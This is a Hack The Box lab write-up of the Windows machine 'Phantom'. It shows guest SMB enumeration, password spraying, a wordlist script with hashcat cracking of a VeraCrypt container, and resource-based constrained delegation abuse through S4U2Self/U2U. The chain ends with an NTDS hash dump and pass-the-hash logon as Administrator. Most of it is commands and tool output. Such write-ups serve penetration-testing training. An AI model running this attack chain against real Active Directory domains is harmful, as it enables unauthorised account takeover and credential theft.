---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - S4U2Self
  - Resource-Based-Constrained-Delegation
---
# Overview

| Name        | Phanthom    |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
Should you need to crack a hash, use a short custom wordlist based on company name and simple mutation rules commonly seen in real life passwords (e.g. year and a special character).
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo nmap -sC -sV -T4 10.129.234.63
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 11:32 +0545
Nmap scan report for 10.129.234.63
Host is up (0.29s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-31 05:47:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.phantom.vl
| Not valid before: 2025-12-30T05:43:24
|_Not valid after:  2026-07-01T05:43:24
|_ssl-date: 2025-12-31T05:48:41+00:00; -21s from scanner time.
| rdp-ntlm-info:
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-31T05:48:04+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-31T05:48:05
|_  start_date: N/A
|_clock-skew: mean: -21s, deviation: 0s, median: -21s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

```bash
10.129.234.63   DC.phantom.vl phantom.vl DC
```
# Enumeration

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ netexec smb 10.129.234.63 -u 'guest' -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest:
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ smbclient //10.129.234.63/Public -U "guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 11 20:48:14 2024
  ..                                DHS        0  Thu Aug 14 17:40:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 21:53:43 2024

                6127103 blocks of size 4096. 1512484 blocks available
smb: \> get tech_support_email.eml
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (12.4 KiloBytes/sec) (average 12.4 KiloBytes/sec)
```

Upon decoding the PDF, I found hardcoded credentials inside the file. This discovery was crucial for the next step, which involved a password spraying attack using the user list I had previously obtained.

```bash
echo "<snipped>...IDI1IDAgUgovSW5mbyAyNiAwIFIKL0lEIFsgPEM0QUQ2NUU5NEZCOTk3OTYx
MTU1Q0FGRkQ2QUMyQjUzPgo8QzRBRDY1RTk0RkI5OTc5NjExNTVDQUZGRDZBQzJCNTM+IF0KL0Rv
Y0NoZWNrc3VtIC8wQTM4N0RBQjYxNTBCMkRCMTg0MzJGMDJENzY2MDQxMwo+PgpzdGFydHhyZWYK
OTQxNAolJUVPRgo=" |base64 -d > out.pdf
```

There’s a default initial password, “Ph4nt0m@5t4rt!”
## RID Cycle

The guest user doesn’t have privileges to list users on the domain. But it can brute force RID’s using a RID-cycle attack:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb 10.129.234.63 -u users.txt  -p 'Ph4nt0m@5t4rt!' --continue-on-success --no-bruteforce
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\svc_sspr:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
```

We’ve got valid creds for user `ibryant`, the first thing I usually do is feed the data into BloodHound to get some context on the user we’re dealing with and where we stand. That way I can see where we might move laterally and get a general map of the AD.

```bash
bloodhound-python -u 'ibryant' -p 'Ph4nt0m@5t4rt!' -ns 10.129.229.112 -d 'phantom.vl' -c all --dns-tcp --zip
```

I navigated through the SMB share into the `IT\Backup` folder. Once inside, I listed the contents and found a file called `IT_BACKUP_201123.hc`. Judging by the extension, it’s most likely a **VeraCrypt/TrueCrypt container**
# Initial Foothold
## VeraCrypt

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ smbclient "//10.129.234.63/Departments Share" -U ibryant%'Ph4nt0m@5t4rt!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 22:10:31 2024
  ..                                DHS        0  Thu Aug 14 17:40:49 2025
  Finance                             D        0  Sat Jul  6 22:10:11 2024
  HR                                  D        0  Sat Jul  6 22:06:31 2024
  IT                                  D        0  Thu Jul 11 20:44:02 2024

                6127103 blocks of size 4096. 1634352 blocks available
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Thu Jul 11 20:44:02 2024
  ..                                  D        0  Sat Jul  6 22:10:31 2024
  Backup                              D        0  Sat Jul  6 23:49:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 21:59:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 22:11:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 22:12:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Mon Oct  2 02:15:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 21:59:08 2024

                6127103 blocks of size 4096. 1637532 blocks available
smb: \IT\> cd Backup
smb: \IT\Backup\> ls
  .                                   D        0  Sat Jul  6 23:49:34 2024
  ..                                  D        0  Thu Jul 11 20:44:02 2024
  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 23:49:14 2024

                6127103 blocks of size 4096. 1638924 blocks available
smb: \IT\Backup\> get IT_BACKUP_201123.hc
```

```bash
smbclient "//10.129.234.63/Departments Share" \
  -U ibryant%'Ph4nt0m@5t4rt!' \
  -t 120 \
  -c 'cd IT\Backup; get IT_BACKUP_201123.hc'
```

```python
#!/usr/bin/env python3

import itertools

company = "Phantom"
years = ["2024", "2023", "2022", "2021", "2020"]
specials = ["!", "@", "#", "$", "%"]

mutations = [
    company.lower(),
    company.upper(),
    company.capitalize(),
]

with open("wordlist.txt", "w") as f:
    for base in mutations:
        # word
        f.write(base + "\n")

        # years
        for y in years:
            f.write(base + y + "\n")

            # year + special
            for s in specials:
                f.write(base + y + s + "\n")

        # special
        for s in specials:
            f.write(base + s + "\n")
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ ls
main.py  wordlist.txt

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ head wordlist.txt
phantom
phantom2024
phantom2024!
phantom2024@
phantom2024#
phantom2024$
phantom2024%
phantom2023
phantom2023!
phantom2023@
```

```sh
hashcat IT_BACKUP_201123.hc wordlist.txt -m 13721
```

`Phantom2023!` is pass.

Next step is mounting the volume we’ve got. 

![[Pasted image 20251231120303.png]]

![[Pasted image 20251231120308.png]]


```
sudo mount /dev/mapper/veracrypt1 /mnt/ctf
```

After digging through all the files and unpacking the `.tar.gz` and `.zip` archives, I run a recursive grep for keywords like “password” and boom!, I find some creds. I instantly throw them into a password spraying attack and land a valid access:

![[Pasted image 20251231120326.png]]

With that password, I run a spraying attack against the user list to see if we can score a new access.. and yes!, we get fresh creds for the `svc_sspr` account. Checking in BloodHound, I saw the account is part of the _==Remote Management Users==_ group, so I attempted to connect.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ evil-winrm -i 10.129.234.63 -u SVC_SSPR -p 'gB6XTcqVP5MlP7Rc'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> cat user.txt
eba10c7762bcce3e7dc21ddae8e7ad94
```
# Privilege Escalation

Our user has rights to force a password change on three accounts:

- wsilva
    
- rnichols
    
- crose
    

So basically: these users are part of the _==ICT Security==_ ==group==, and that group has the **==AddAllowedToAct==** privilege on the `DC`. That means we can mess with the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to add our own machine account, opening the door to abuse via `RBCD`.

![[Pasted image 20251231120704.png]]

![[Pasted image 20251231120712.png]]

As mentioned, we have the `ForceChangePassword` privilege, and I chose Crose to reset their password.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ bloodyAD --host DC.phantom.vl -d phantom.vl -u 'SVC_SSPR' -p 'gB6XTcqVP5MlP7Rc' set password CROSE 'Pepe1234#'
[+] Password changed successfully!
```
## Abusing Resource-Based Constrained Delegation

RBCD allows us to escalate by editing the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute so another account can impersonate users via Kerberos S4U. Normally, you need a computer account, but if the domain blocks new machines (in this case 0 quota), you can exploit password/NT hash tricks to align with the TGT session key and still pull it off.

![[Pasted image 20251231120840.png]]
### REFERENCES:

- [https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
    
- [https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)

With `rbcd.py`, I passed a machine account using `-delegate-to`, and for the user, I handed over `CROSE`.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ rbcd.py -delegate-to "DC$" -delegate-from "CROSE" -dc-ip 10.129.234.63 -action write "DC.phantom.vl/CROSE:Pepe1234#"
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] CROSE can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     crose        (S-1-5-21-4029599044-1972224926-2225194048-1126)
```

I grabbed a TGT through an overpass-the-hash attack and extracted the TGT session key using `describeTicket.py`.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ getTGT.py -hashes :$(pypykatz crypto nt 'Pepe1234#') 'phantom.vl'/'CROSE'
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in CROSE.ccache
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ describeTicket.py CROSE.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : 99b467ef4e3b2876e05a4652033139c3
```

Then, I swapped it out with the domain user’s NT hash.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ changepasswd.py -newhashes :99b467ef4e3b2876e05a4652033139c3 'phantom.vl'/'CROSE':'Pepe1234#'@'DC.phantom.vl'
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of phantom.vl\CROSE
[*] Connecting to DCE/RPC as phantom.vl\CROSE
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

Using `S4U2Self` together with `u2u`, the CROSE account can request a service ticket for itself while impersonating the **Administrator**. From there, we pivot into `S4U2Proxy` to request a service ticket for the target machine that the user has delegation rights over.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ export KRB5CCNAME=CROSE.ccache

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'CROSE'
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ nxc smb dc.phantom.vl --use-kcache --ntds --user Administrator
SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         dc.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
SMB         dc.phantom.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.phantom.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
SMB         dc.phantom.vl   445    DC               [+] Dumped 1 NTDS hashes to /home/at0m/.nxc/logs/ntds/DC_dc.phantom.vl_2025-12-31_121209.ntds of which 1 were added to the database
SMB         dc.phantom.vl   445    DC               [*] To extract only enabled accounts from the output file, run the following command:
SMB         dc.phantom.vl   445    DC               [*] cat /home/at0m/.nxc/logs/ntds/DC_dc.phantom.vl_2025-12-31_121209.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc.phantom.vl   445    DC               [*] grep -iv disabled /home/at0m/.nxc/logs/ntds/DC_dc.phantom.vl_2025-12-31_121209.ntds | cut -d ':' -f1
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/htb]
└─$ evil-winrm -i 10.129.234.63 -u Administrator -H 'aa2abd9db4f5984e657f834484512117'
```

---